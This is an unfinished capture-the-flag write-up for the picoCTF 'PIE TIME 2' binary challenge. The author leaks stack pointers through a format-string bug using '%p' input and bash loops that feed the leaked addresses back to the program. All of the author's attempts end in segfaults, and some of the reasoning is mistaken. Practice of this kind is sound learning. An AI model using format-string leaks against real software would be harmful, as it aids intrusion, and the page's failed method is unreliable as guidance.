<head><link rel="stylesheet" href="../css/main.css"></head>
<body><h1>PIE TIME 2</h1>
<hr />
<p>this is a <a href="https://play.picoctf.org/practice/challenge/491?originalEvent=74&amp;page=2">pico ctf</a> challenge</p>
<hr />
<h4>Description</h4>
<blockquote>
<p>Can you try to get the flag? I'm not revealing anything anymore!!
Additional details will be available after launching your challenge instance.</p>
</blockquote>
<p>This prompted me to look at the PIE TIME 1 to refresh my mind on what kind things it entailed. It was a program that you gave a memroy address so you could jump to the win function.</p>
<p>I tried doing an <code>objdump -d vuln</code> to see the memroy addresses of the functions. I found where the scanf happens and wehre the win function is. There is alo a printf vunerability as its not a string lineral from an buffer input. First thing I tried to exploit the printf vunerability is to do a enter a string of <code>%p</code>.</p>
<p><img alt="screen shot of terminal with %p... inputs" src="../images/terminal_000.png" /></p>
<p>I wasnt too sure about c format exploits so i found examples on this <a href="https://exploit-notes.hdks.org/exploit/binary-exploitation/method/binary-exploitation-with-format-string/">site</a></p>
<pre><code>$ Enter your name:%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
0x558c6abc82a10xfbad22880x7fff0e5e73d0(nil)0x21001(nil)0x7f852f6917600x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x25702570257025(nil)0xfffbdc94dca48000x7fff0e5e74300x558c447c54410x10x7f852f4e524a0x7fff0e5e75300x558c447c54000x1447c40400x7fff0e5e75480x7fff0e5e75480xee96304b47191866(nil)0x7fff0e5e7558(nil)0x7f852f6f2020
</code></pre>
<pre><code class="language-python">&gt; &gt; &gt; for i in a.split(&quot;0x&quot;):
&gt; &gt; &gt; ... print(i)
&gt; &gt; &gt; ...

558c6abc82a1
fbad2288
7fff0e5e73d0
21001
7f852f691760
7025702570257025
7025702570257025
7025702570257025
7025702570257025
7025702570257025
7025702570257025
7025702570257025
25702570257025
fffbdc94dca4800
7fff0e5e7430
558c447c5441
1
7f852f4e524a
7fff0e5e7530
558c447c5400
1447c4040
7fff0e5e7548
7fff0e5e7548
ee96304b47191866
7fff0e5e7558
7f852f6f2020
</code></pre>
<p>in the objdump i found <code>000000000000136a &lt;win&gt;:</code> and <code>1340: e8 5b fe ff ff          call   11a0 &lt;__isoc99_scanf@plt&gt;</code>. I suspect <code>7fff0e5e73d0</code> to be my current pointer address.
this would mean that there is a 2A difference from 136A to 1340. so if i did 2a + 7fff0e5e73d0, I might jump to the win subroutine.</p>
<p>None of this worked. When I entered any of the addresses I kept getting the: <code>Segfault Occurred, incorrect address.</code>.</p>
<p>I tried to write a script to print out different pointers:</p>
<pre><code class="language-bash">#!/bin/bash

for i in {1..128}; do
    leak=$(echo -e &quot;%$i\$p&quot; | ./vuln | grep -o '0x[0-9a-fA-F]\{6,\}' | grep -v '^0x12345$')
    if [ -n &quot;$leak&quot; ]; then
        echo &quot;$leak&quot;
    fi
done
</code></pre>
<p>I ran <code>bash script.sh | sort -u</code> to find all the unique addresses with no nils.</p>
<p>this printed:</p>
<pre><code>0x19940e040
0x224b10834a80d4ba
0x559173ebc441
0x55e5e3ae9400
0x55f9785fe1c0
0x5603b5a291ee
0x560a255d11c0
0x563a268812a5
0x5643098be040
0x564cc0f2e400
0x7f061bb96020
0x7f1edad8a079
0x7f27510b65e0
0x7f37166d324a
0x7f4ca82b1760
0x7f787f6ed299
0x7f9a69cfe305
0x7fa9423cc760
0x7fe84ba3d000
0x7ff500000000
0x7ffc175c45f8
0x7ffc17d94e17
0x7ffc1b8b7d21
0x7ffc4449b600
0x7ffc53ef1544
0x7ffc5526d4bb
0x7ffc889944a5
0x7ffcee2253f0
0x7ffd12ca3344
0x7ffd19da16d0
0x7ffd1b616e48
0x7ffd3647fe08
0x7ffd4805a57a
0x7ffd4bebcdb9
0x7ffd60dc4357
0x7ffd65e1e5cb
0x7ffd8af30f97
0x7ffd9033a468
0x7ffd94597d77
0x7ffdb1a163c9
0x7ffdc0093ddb
0x7ffdc063b40b
0x7ffdc201d3dc
0x7ffdd99e55b6
0x7ffe0385afcd
0x7ffe2d1c8cf6
0x7ffe30a26f60
0x7ffe35f334ef
0x7ffe39a025da
0x7ffe5f730248
0x7ffe7ece552e
0x7ffe8e01bd8e
0x7ffea08e2e29
0x7ffeabcf7468
0x7ffec0344491
0x7ffec359efe8
0x7ffed0941515
0x7ffed884a4d7
0x7ffee0eabe0c
0x7ffeed489000
0x7ffeedb44456
0x7ffefce2b4fb
0x7fff0dcb4f86
0x7fff1f643e04
0x7fff232b9dd2
0x7fff27dd1da5
0x7fff28b32df9
0x7fff60478948
0x7fff70b995e7
0x7fff726da8a0
0x7fff83e2042a
0x7fff936f6848
0x7fff9bf2dcdc
0x7fffb3aa0377
0x7fffb410ed07
0x7fffcaa8933d
0x7fffda6e0ec0
0x7ffff11f0998
0x7ffffaa2f413
0x82a4ac3e8a61bd65
0xa702431
0xa702433
0xa70243825
0xbcbefc29544bdf12
0xbfebfbff
0xc69412d00aa6ca00
0xe10d7314ac105b00
0xfbad2088
</code></pre>
<p>This printed out the frist 128 pointers on the stack which is essetially what <code>%p%p%p..</code> did</p>
<p>I ran through all these addresses with this script:</p>
<pre><code class="language-bash">#!/bin/bash

for i in {1..128}; do
    leak=$(echo -e &quot;%$i\$p&quot; | ./vuln | grep -o '0x[0-9a-fA-F]\{6,\}' | grep -v '^0x12345$')
    if [ -n &quot;$leak&quot; ]; then
        echo -e &quot;$leak\n$leak&quot; | ./vuln
    fi
done
</code></pre>
<p>but they still all result in segfualts.</p></body>